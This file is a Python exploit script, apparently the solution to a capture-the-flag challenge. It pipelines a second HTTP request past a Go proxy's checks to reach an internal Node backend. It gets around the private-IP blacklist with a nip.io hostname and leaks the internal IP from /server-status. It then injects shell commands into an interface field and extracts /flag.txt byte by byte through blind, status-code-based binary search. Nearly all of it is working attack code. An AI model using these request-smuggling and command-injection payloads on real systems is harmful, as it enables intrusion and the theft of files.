#!/usr/bin/env python3
import re
import socket
import sys
from concurrent.futures import ThreadPoolExecutor

# The Go proxy only checks the first request's line and body, then forwards the
# raw bytes to the Host it names. R1 passes those checks; R2 rides behind it on
# the same connection and reaches the Node backend on :5000 unchecked.


def fetch_internal_ip(proxy_host, proxy_port):
    # /server-status is answered by the proxy itself, before any Host check.
    s = socket.create_connection((proxy_host, proxy_port), timeout=20)
    s.sendall(b"GET /server-status HTTP/1.1\r\nHost: x\r\n\r\n")
    out = b""
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        out += chunk
    s.close()
    match = re.search(r"IPs: ([\d.]+)", out.decode(errors="replace"))
    if not match:
        raise RuntimeError("no IPs in /server-status")
    return match.group(1)


def internal_host(ip):
    # nip.io maps "10-244-14-223.nip.io" to 10.244.14.223. The dots are replaced
    # so the proxy's "10." and "172." blacklist does not match.
    return ip.replace(".", "-") + ".nip.io:5000"


def send_pipelined(proxy_host, proxy_port, host, interface_json):
    body = '{"interface":"' + interface_json + '"}'
    r1 = (
        f"POST /getAddresses HTTP/1.1\r\nHost: {host}\r\n"
        "Content-Type: text/plain\r\nContent-Length: 1\r\n\r\na"
    )
    r2 = (
        "POST /flushInterface HTTP/1.1\r\nHost: 127.0.0.1:5000\r\n"
        "Content-Type: application/json\r\nConnection: close\r\n"
        f"Content-Length: {len(body.encode())}\r\n\r\n{body}"
    )
    s = socket.create_connection((proxy_host, proxy_port), timeout=20)
    s.sendall((r1 + "\r\n\r\n" + r2).encode())
    out = b""
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        out += chunk
    s.close()
    # The second status line is the flushInterface answer.
    codes = re.findall(r"HTTP/1\.1 (\d{3})", out.decode(errors="replace"))
    return codes[-1] if len(codes) >= 2 else None


def check(proxy_host, proxy_port, host, shell_cmd):
    # ip's stderr must be empty for a 200. A tab (JSON \t) separates the
    # redirect from the interface name, because ${IFS} would glue "2" to it.
    # The injected command runs next; a failure writes to stderr and gives 401.
    interface = "x\\t2>/dev/null;" + shell_cmd + "||echo\\tx>&2"
    # A timed-out request must not count as a false answer, so retry it.
    for _ in range(3):
        try:
            return send_pipelined(proxy_host, proxy_port, host, interface) == "200"
        except (socket.timeout, OSError):
            continue
    raise RuntimeError("request failed 3 times")


def byte_at(proxy_host, proxy_port, host, pos, path):
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        cmd = (
            f"[\\t$(head\\t-c{pos}\\t{path}|tail\\t-c1|od\\t-An\\t-tu1)\\t-gt\\t{mid}\\t]"
        )
        if check(proxy_host, proxy_port, host, cmd):
            lo = mid + 1
        else:
            hi = mid
    return lo


def exploit(proxy_host, proxy_port, path="/flag.txt", max_len=80):
    ip = fetch_internal_ip(proxy_host, proxy_port)
    host = internal_host(ip)
    print(f"[*] Backend at {ip} via {host}")
    print(f"[*] Extracting {path} one byte at a time...")
    with ThreadPoolExecutor(max_workers=8) as ex:
        values = list(
            ex.map(
                lambda p: byte_at(proxy_host, proxy_port, host, p, path),
                range(1, max_len + 1),
            )
        )
    flag = ""
    for v in values:
        if v == 0:
            break
        flag += chr(v)
    print(f"\n[+] Flag:\n{flag.strip()}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
